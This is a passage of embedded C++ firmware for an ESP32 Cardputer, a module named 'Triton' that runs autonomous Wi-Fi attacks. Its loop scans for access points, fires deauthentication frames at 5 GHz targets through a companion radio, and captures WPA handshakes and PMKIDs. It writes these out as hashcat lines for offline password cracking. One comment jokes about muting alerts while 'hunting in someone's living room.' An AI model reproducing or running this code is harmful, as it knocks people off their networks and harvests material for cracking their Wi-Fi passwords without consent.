    /* Fast active scan at entry so Triton doesn't sit with APs: 0 for
     * 15-30 s waiting for beacons to drift in on the hopped channel.
     * Synchronous (blocks ~1.2 s) but user-facing much better than
     * a cold start. Falls back silently if radio isn't ready. */
    int found = WiFi.scanNetworks(false, true /* show hidden */,
                                  false /* passive */, 120 /* ms */);
    if (found > 0) {
        int seed = 0;
        portENTER_CRITICAL(&s_bs_mux);
        for (int i = 0; i < found && s_bs_n < BS_N; ++i) {
            const uint8_t *bs = WiFi.BSSID(i);
            if (!bs) continue;
            /* Dedup: don't re-add a BSSID wardrive already seeded. */
            bool dup = false;
            for (int j = 0; j < s_bs_n; ++j) {
                if (memcmp(s_bs[j].bssid, bs, 6) == 0) { dup = true; break; }
            }
            if (dup) continue;
            memcpy(s_bs[s_bs_n].bssid, bs, 6);
            String ss = WiFi.SSID(i);
            strncpy(s_bs[s_bs_n].ssid, ss.c_str(), sizeof(s_bs[s_bs_n].ssid) - 1);
            s_bs[s_bs_n].ssid[sizeof(s_bs[s_bs_n].ssid) - 1] = 0;
            s_bs_n++;
            seed++;
        }
        portEXIT_CRITICAL(&s_bs_mux);
        Serial.printf("[triton] active-scan seeded %d APs\n", seed);
    }
    WiFi.scanDelete();

    s_ch = 1; s_alive = true;
    s_born = millis();
    s_last_catch = s_born;

    /* Try to open the GPS HAT. If the user's running on Hydra or no
     * LoRa-1262 is attached, gps_begin() returns false and we just
     * skip the wardrive CSV. Works without a fix too — emit_pmkid /
     * emit_hs check sats > 0 before writing a wardrive row. */
    gps_begin();

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(cb);
    esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);

    xTaskCreate(hop_task, "triton", 3072, nullptr, 4, nullptr);

    /* If a C5 is online, kick off a parallel 5 GHz scan so we have
     * targets to deauth on the upper band. */
    c5_begin();
    bool c5_online = c5_any_online();
    if (c5_online) {
        c5_clear_results();
        c5_cmd_scan_5g(400);
    }
    uint32_t last_c5_deauth = 0;
    int c5_target_idx = 0;

    ui_draw_footer("autonomous  [M]=mute  [?]=help  `=back");

    uint32_t last_draw = 0;
    uint32_t last_mood = 0;
    mood_t   mood = MOOD_SLEEPY;
    uint32_t stoked_until = 0;
    uint32_t prev_total = 0;

    while (true) {
        uint32_t now = millis();
        uint32_t total = s_pmk + s_hs;
        if (total > prev_total) {
            uint32_t diff = total - prev_total;
            prev_total = total;
            stoked_until = now + 5000;
            /* Full-screen dramatic overlay. s_hs >= 1 means this was
             * a handshake, otherwise it's a PMKID. */
            static uint32_t prev_hs = 0;
            bool was_hs = (s_hs > prev_hs);
            prev_hs = s_hs;
            char sub[48];
            snprintf(sub, sizeof(sub), "total: %lu", (unsigned long)total);
            /* sfx_capture is the full POSEIDON "caught one" jingle —
             * respects the global mute flag, so the [M] hotkey below
             * silences it mid-session without losing the overlay. */
            sfx_capture();
            if (was_hs) {
                ui_action_overlay("HANDSHAKE!", sub, ACT_BG_WAVES, 0xF81F, 1400);
            } else {
                ui_action_overlay("PMKID", sub, ACT_BG_RADAR, 0x07FF, 900);
            }
            (void)diff;
        }

        if (now - last_mood > 400) {
            last_mood = now;
            mood = (now < stoked_until) ? MOOD_STOKED : mood_now();
        }

        if (now - last_draw > 120) {
            last_draw = now;
            auto &d = M5Cardputer.Display;
            ui_clear_body();

            /* ---- LEFT ZONE: face + speech bubble + uptime ---- */
            draw_face(54, BODY_Y + 36, mood, now);

            /* Bordered speech bubble beneath the face. */
            const char *w = mood_word(mood);
            d.fillRoundRect(4, BODY_Y + 72, 106, 14, 3, 0x10A2);
            d.drawRoundRect(4, BODY_Y + 72, 106, 14, 3, T_WARN);
            d.drawPixel(20, BODY_Y + 71, T_WARN);  /* connector tail */
            d.setTextColor(T_WARN, 0x10A2);
            d.setCursor(8, BODY_Y + 75);
            d.printf("%s", w);

            /* Uptime. */
            uint32_t up_s = (now - s_born) / 1000;
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 90);
            if (up_s >= 3600) d.printf("%luh%02lum", (unsigned long)(up_s/3600), (unsigned long)((up_s%3600)/60));
            else              d.printf("%lum%02lus", (unsigned long)(up_s/60), (unsigned long)(up_s%60));

            /* ---- RIGHT ZONE: title + stats + sparkline ---- */
            int rx = 114;

            /* Header: TRITON + mode + C5 dot. */
            d.setTextColor(T_ACCENT, T_BG);
            d.setCursor(rx, BODY_Y + 4); d.print("TRITON");
            d.setTextColor(T_ACCENT2, T_BG);
            d.setCursor(rx + 58, BODY_Y + 4); d.print(mode_name(s_mode));
            if (c5_online) d.fillCircle(236, BODY_Y + 7, 3, T_GOOD);
            d.drawFastHLine(rx, BODY_Y + 14, 122, T_ACCENT);

            /* Channel + TX indicator. */
            d.setTextColor(T_FG, T_BG);
            d.setCursor(rx, BODY_Y + 18); d.printf("ch: %u", s_ch);
            /* Blink TX dot when in an active deauth mode. */
            if (s_mode != TM_STEALTH && ((now / 250) & 1))
                d.fillCircle(rx + 50, BODY_Y + 21, 2, T_BAD);
            if (s_mode == TM_STEALTH)
                d.setCursor(rx + 46, BODY_Y + 18), d.setTextColor(T_DIM, T_BG), d.print("RX");

            /* APs + deauth frame counter. TX stat is what the user
             * really wants to see moving when Triton's working. */
            d.setTextColor(T_FG, T_BG);
            d.setCursor(rx, BODY_Y + 28); d.printf("APs: %d", s_bs_n);
            d.setTextColor(s_deauth_frames > 0 ? T_BAD : T_DIM, T_BG);
            d.setCursor(rx, BODY_Y + 38);
            d.printf("TX:  %lu", (unsigned long)s_deauth_frames);

            /* PMK — green when captured. */
            d.setTextColor(s_pmk > 0 ? T_GOOD : T_DIM, T_BG);
            d.setCursor(rx, BODY_Y + 48); d.printf("PMK: %lu", (unsigned long)s_pmk);

            /* HS — the hero stat. Flash row on capture. */
            static uint32_t hs_flash_until = 0;
            if (s_hs > 0 && now < stoked_until) hs_flash_until = now + 500;
            bool hs_flash = (now < hs_flash_until) && ((now / 100) & 1);
            if (hs_flash) d.fillRect(rx - 2, BODY_Y + 56, 126, 12, T_ACCENT);
            d.setTextColor(hs_flash ? T_BG : (s_hs > 0 ? T_ACCENT : T_FG),
                           hs_flash ? T_ACCENT : T_BG);
            d.setCursor(rx, BODY_Y + 58); d.printf("HS:  %lu", (unsigned long)s_hs);

            /* Channel quality sparkline — 13 bars for the RL brain. */
            int spark_y = BODY_Y + 74;
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(rx, spark_y - 8); d.print("RL:");
            for (int i = 1; i <= 13; i++) {
                int bx = rx + 20 + (i - 1) * 8;
                int bh = (int)(s_q[i] * 12);
                if (bh < 1) bh = 1;
                if (bh > 12) bh = 12;
                uint16_t bc = (i == (int)s_ch) ? T_ACCENT : T_DIM;
                d.fillRect(bx, spark_y + 12 - bh, 6, bh, bc);
                d.drawRect(bx, spark_y, 6, 12, 0x2104);
            }

            ui_draw_status("wifi", "triton");
        }

        /* 5 GHz attack window: fire C5 commands. Only runs during
         * phase_5g so we're not competing with softAP deauth TX for
         * buffers. Rotate every 6 s inside the 10 s window → ~1 target
         * hit per 5G phase, every ~20 s cycle. */
        if (s_phase_5g && c5_online && now - last_c5_deauth > 6000) {
            last_c5_deauth = now;
            c5_ap_t aps[64];
            int n = c5_aps(aps, 64);
            int five_n = 0;
            for (int i = 0; i < n; ++i) if (aps[i].is_5g) aps[five_n++] = aps[i];
            if (five_n > 0) {
                const c5_ap_t &t = aps[c5_target_idx % five_n];
                /* HS capture first so the C5 is already listening when
                 * the deauth storm forces the re-auth. */
                c5_cmd_hs(t.bssid, t.channel, 5000);
                c5_cmd_deauth(t.bssid, t.channel, 0, 4000);
                c5_target_idx++;
            } else {
                c5_clear_results();
                c5_cmd_scan_5g(400);
            }
        }

        /* Drain RESP_HS tuples from the C5 into the hashcat log. This
         * runs every loop regardless of phase — if the C5 captured a
         * handshake during its window we want to flush it ASAP. */
        if (c5_online) {
            c5_hs_t hs[4];
            int nh = c5_hss(hs, 4);
            for (int i = 0; i < nh; ++i) {
                char ssid[33] = {0};
                ssid_of(hs[i].bssid, ssid, sizeof(ssid));

                /* Compose WPA*02* line — same format as local emit_hs. */
                char line[1024] = "WPA*02*";
                hexcat(line, hs[i].mic, 16);    strcat(line, "*");
                hexcat(line, hs[i].bssid, 6);   strcat(line, "*");
                hexcat(line, hs[i].sta, 6);     strcat(line, "*");
                for (size_t k = 0; k < strlen(ssid); ++k) {
                    char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[k]);
                    strcat(line, h);
                }
                strcat(line, "*");
                hexcat(line, hs[i].anonce, 32); strcat(line, "*");
                int m2 = hs[i].eapol_m2_len;
                if (m2 > 128) m2 = 128;
                if (m2 < 0)   m2 = 0;
                hexcat(line, hs[i].eapol_m2, m2);
                strcat(line, "*02\n");
                capture_enqueue(line);
                wdr_append(hs[i].bssid, ssid, "EAPOL_HS_5G");
                s_hs++;
            }
            if (nh > 0) {
                /* Clear only the HS portion — we re-use c5_aps results
                 * for the 5G target list, so wiping everything would
                 * nuke our scan cache. Re-fetching preserves dedup. */
                c5_clear_results();
                c5_cmd_scan_5g(400);
            }
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == '?') { ui_show_current_help(); }
        if (k == 'm' || k == 'M') {
            /* Toggle global SFX mute in-session. Captures keep firing
             * — just without the jingle — for when you're hunting in
             * someone's living room and don't want POSEIDON chirping
             * "HANDSHAKE!" every two minutes. */
            bool m = !sfx_is_muted();
            sfx_set_mute(m);
            ui_toast(m ? "muted" : "sound on", m ? T_WARN : T_GOOD, 600);
        }
    }

    s_alive = false;
    esp_wifi_set_promiscuous(false);
    if (s_file)     { s_file.flush();     s_file.close(); }
    if (s_wdr_file) { s_wdr_file.flush(); s_wdr_file.close(); }
    gps_end();
    delay(200);
}
